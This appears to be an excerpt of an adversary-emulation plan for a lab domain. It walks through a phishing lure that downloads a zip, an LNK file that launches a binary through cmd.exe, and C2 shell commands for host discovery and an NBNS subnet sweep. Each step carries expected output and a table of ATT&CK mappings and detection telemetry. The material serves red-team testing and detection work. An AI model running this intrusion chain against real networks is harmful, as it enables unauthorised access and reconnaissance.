...
2. ☣️ On WS01 as `TESTLAB\labuser`: double-click `Desktop\Braavos_Competitiveness_Brief.docx` to open in Word, then CTRL+click the embedded link inside the document
   ...
   - ***Expected Output***
     ```text
     Browser (Edge/Chrome) opens and navigates to http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip
...
| LNK cmd.exe /c EssosUpdate.exe process spawn | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `explorer.exe` spawns `cmd.exe /c .\EssosUpdate.exe` from `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes\` — `cmd.exe` acting as a pass-through launcher for a user-placed binary in a non-standard location | Not Calibrated - Not Benign | redundant@T1204.002 | LNK shortcut fires `cmd.exe /c .\EssosUpdate.exe` in the extraction directory; `cmd.exe` parented by `explorer.exe` | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | — |
...
2. ☣️ Execute local discovery on WS01:

   ```
   shell C:\Windows\Temp\WNetHelper.exe local
   ```
   ...
   - ***Expected Output***
     ...
     IsAdmin        : False
     Groups         : TESTLAB\Domain Users, BUILTIN\Users, BUILTIN\Remote Desktop Users
     ...
     [SERVICES]
     Name          Start  Type  DisplayName
     WinDefend     2      32    Windows Defender Antivirus Service
     ...           (truncated)

     [MEMBERS]
     Administrators (2 member(s))
       WS01\Administrator
       TESTLAB\Domain Admins

     [FILES]
     C:\Users\: labuser\, Public\
     C:\Windows\Temp\: WNetHelper.exe
     ```

3. ☣️ Execute the scanner against the internal subnet:

   ```
   shell C:\Windows\Temp\WNetHelper.exe 10.12.10.0/24
   ```

   - ***Expected Output***
     ```text
     Scanning 10.12.10.1 - 10.12.10.254
     10.12.10.20     TESTLAB\IIS01               DC         Vmware
     10.12.10.30     TESTLAB\WS01
     ```
...
| WNetHelper NBNS subnet sweep to 10.12.10.0/24 on UDP/137; responses identify DC-flagged hosts | Discovery | T1018 | Remote System Discovery | Windows | `WNetHelper.exe` sends NBNS NAME QUERY REQUEST packets to every IP in `10.12.10.0/24` via UDP port 137 and receives responses identifying domain-joined hosts — network telemetry shows a systematic per-IP NBNS sweep from a non-OS process; burst rate and full-subnet sequential targeting distinguishes this from background NetBIOS traffic; `IIS01` (10.12.10.20) identified as DC-flagged server from NBNS response flags | Calibrated - Not Benign | - | `WNetHelper.exe` sends NBNS NAME QUERY REQUEST packets to each IP in `10.12.10.0/24` via UDP port 137 and parses responses to identify domain-joined hosts; IIS01 (10.12.10.20) identified as DC-flagged server; result returned via C2 EXEC response | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | — |
